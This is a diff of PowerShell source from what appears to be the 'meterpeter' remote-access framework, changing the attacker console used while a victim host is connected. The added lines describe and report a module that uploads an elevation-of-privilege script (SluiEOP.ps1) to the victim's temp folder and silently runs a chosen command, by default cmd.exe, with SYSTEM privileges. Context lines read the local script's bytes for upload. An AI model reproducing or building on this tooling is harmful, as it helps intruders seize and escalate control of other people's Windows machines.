@@ -933,6 +933,10 @@ While($Client.Connected)
            {
               write-host " - Input Command: " -NoNewline;
               $mYcOMMAND = Read-Host
+              write-host "`n`n   Remark" -ForegroundColor Yellow;
+              write-host "   ------";
+              write-host "   This module uploads SluiEOP.ps1 script to `$env:TMP dir and executes";
+              write-host "   EOP to be abble to silent execute our command with higth privileges.";
               If(-not($mYcOMMAND) -or $mYcOMMAND -eq $null){$mYcOMMAND = "$env:WINDIR\System32\cmd.exe"}
               ## Write Local script (SluiEOP.ps1.ps1) to Remote-Host $env:tmp
               $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
@@ -2007,6 +2011,8 @@ While($Client.Connected)
       {
         If($OutPut -ne " ")
         {
+
+
           If($Cam_set -eq "True")
           {
             $OutPut = $OutPut|findstr /s /I /C:"Device name:";
@@ -2014,6 +2020,11 @@ While($Client.Connected)
             write-host "    ------------------";
             Write-Host "  $OutPut";
             $Cam_set = "False";
+          }ElseIf($SluiEOP -eq "True"){
+            Write-Host "   Privs   Status   Description" -ForeGroundColor green;
+            Write-Host "   -----   ------   -----------";
+            Write-Host "   system  execute  '$mYcOMMAND'"
+            $SluiEOP = "False"
           }else{
             $OutPut = $OutPut -replace "`n","";
             If($OutPut -match "GetBrowsers.ps1"){
@@ -2028,13 +2039,6 @@ While($Client.Connected)
           {
             Write-Host "   execute  :meterpeter> Get-Help ./GetBrowsers.ps1 -full" -ForeGroundColor Yellow;
             $Tripflop = "False";
-          } 
-          If($SluiEOP -eq "True")
-          {
-            Write-Host "`n   Executing EOP Command" -ForeGroundColor green;
-            Write-Host "   ---------------------"
-            Write-Host "   $mYcOMMAND" -ForeGroundColor yellow;Start-Sleep -Seconds 1
-            $SluiEOP = "False";
           }
           If($Flipflop -eq "True")
           {
